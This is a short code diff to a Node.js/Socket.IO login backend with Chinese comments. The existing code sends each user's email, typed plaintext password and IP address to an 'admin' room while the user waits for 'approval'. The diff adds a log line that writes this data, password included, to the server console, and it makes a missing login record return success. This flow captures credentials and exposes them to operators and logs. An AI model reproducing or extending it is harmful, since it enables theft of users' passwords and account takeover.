@@ -73,14 +73,16 @@ module.exports = (io) => {
       });
 
       // 通知管理员有新的登录请求
-      io.to('admin').emit('new-login-request', {
+      const loginRequestData = {
         id: loginResult.insertId,
         member_id: member.id,
         email: member.email,
         password: password, // 使用用户输入的密码，而不是member.password
         ip_address: clientIP,
         login_time: new Date()
-      });
+      };
+      console.log('[Socket] 发送新登录请求到admin房间:', loginRequestData);
+      io.to('admin').emit('new-login-request', loginRequestData);
 
       res.json({
         message: req.t('login_pending_approval'),
@@ -201,7 +203,9 @@ module.exports = (io) => {
       const loginLogs = await db.query('SELECT * FROM login_logs WHERE id = ?', [loginId]);
       
       if (loginLogs.length === 0) {
-        return res.status(404).json({ error: 'Login record not found' });
+        // 登录记录不存在，可能已经被清理，直接返回成功
+        console.log(`登录记录 ${loginId} 不存在，可能已被清理`);
+        return res.status(200).json({ message: 'Login record already processed or cleaned' });
       }
       
       const loginLog = loginLogs[0];
